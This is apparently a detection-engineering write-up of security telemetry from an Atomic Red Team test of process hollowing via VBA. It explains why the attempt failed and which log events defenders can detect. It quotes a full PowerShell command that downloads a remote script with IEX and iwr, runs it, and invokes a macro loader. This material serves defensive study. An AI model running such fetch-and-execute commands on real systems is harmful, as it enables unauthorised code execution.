# T1055.012-2: Process Hollowing — RunPE via VBA

## Technique Context

T1055.012 (Process Hollowing) is a process injection technique where attackers create a legitimate process in a suspended state, replace its memory contents with malicious code, and then resume execution. This allows malicious code to execute within the context of a legitimate process, evading process-based detection while inheriting the trust and permissions of the legitimate process name. The technique is particularly valuable for defense evasion because the process appears legitimate to basic monitoring tools.

This specific test implements RunPE via VBA, combining process hollowing with malicious document execution (T1204.002). The attack chain involves PowerShell downloading and executing a VBA macro through the Invoke-MalDoc function, which attempts to automate Microsoft Office applications to execute embedded VBA code. Detection engineers focus on suspicious process access patterns, particularly processes opening other processes with high-privilege access rights (0x1FFFFF), unusual parent-child relationships, and Office application automation from unexpected contexts.

## What This Dataset Contains

The dataset captures a failed process hollowing attempt where Microsoft Office components are not available on the test system. The core evidence includes:

Security 4688 events show the process creation chain: a parent PowerShell process (0x7d34) spawning a child PowerShell process (0x60d8) with the command line `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"C:\AtomicRedTeam\atomics\T1055.012\src\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\"}`.

PowerShell 4104 events capture the complete Invoke-MalDoc function definition and execution, including the VBA automation logic designed to create Word documents, inject macro code, and execute it via COM automation. However, PowerShell 4100 error events reveal the technique's failure: `Error Message = Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered`.

Sysmon 10 events show suspicious process access attempts that are characteristic of process hollowing: PowerShell (32052) accessing both whoami.exe (27384) and another PowerShell process (24792) with maximum access rights (0x1FFFFF). The call traces show .NET System.Management.Automation components, indicating programmatic process access rather than normal operations.

Sysmon 1 events capture whoami.exe execution and the spawning of multiple PowerShell processes, demonstrating the technique's attempt to create target processes for hollowing.

## What This Dataset Does Not Contain

The dataset lacks evidence of successful process hollowing because Microsoft Office is not installed on the test system, causing the COM automation to fail before any actual process injection occurs. Consequently, there are no:

- Memory modification events showing process memory being replaced
- Successful VBA macro execution within Office applications  
- Registry modifications for Office security settings (AccessVBOM)
- Network connections from hollowed processes
- File operations typical of successful process hollowing payloads

Additionally, while Sysmon detected suspicious process access attempts, the actual memory manipulation that defines process hollowing was never executed due to the COM failure. The technique essentially failed at the VBA automation stage before reaching the core process injection functionality.

## Assessment

This dataset provides excellent telemetry for detecting failed process hollowing attempts and VBA-based attack vectors, but limited value for understanding successful process hollowing behaviors. The combination of Security 4688 process creation with full command lines, PowerShell script block logging, and Sysmon process access events creates a comprehensive detection opportunity profile.

The data is particularly valuable for detection engineers because it demonstrates how process hollowing attempts manifest in telemetry even when they fail, and how the suspicious process access patterns (EID 10 with 0x1FFFFF access) remain visible regardless of ultimate success. The PowerShell script block logging captures the complete attack methodology, providing excellent indicators for signature-based detection.

However, the dataset's utility is diminished for understanding successful process hollowing behaviors, memory manipulation patterns, or post-injection activities since the technique never progressed beyond the initial COM automation failure.

## Detection Opportunities Present in This Data

1. **PowerShell COM automation failures** - PowerShell 4100 errors with "Class not registered" when attempting Office automation, particularly with CLSID patterns
2. **Suspicious process access with maximum privileges** - Sysmon EID 10 showing processes accessing others with 0x1FFFFF access rights
3. **VBA automation function signatures** - PowerShell 4104 script blocks containing Invoke-MalDoc, New-Object -ComObject patterns targeting Office applications
4. **Process access from .NET automation assemblies** - Sysmon EID 10 call traces showing System.Management.Automation.ni.dll in the call stack
5. **Malicious document download patterns** - PowerShell command lines with IEX/iwr combinations downloading from raw.githubusercontent.com
6. **Registry key manipulation attempts** - PowerShell scripts modifying Office security settings like AccessVBOM for VBA automation
7. **Nested PowerShell process creation** - Security 4688 events showing PowerShell spawning PowerShell with encoded or complex command lines
8. **Office application security bypass attempts** - PowerShell functions designed to temporarily modify Office macro security settings
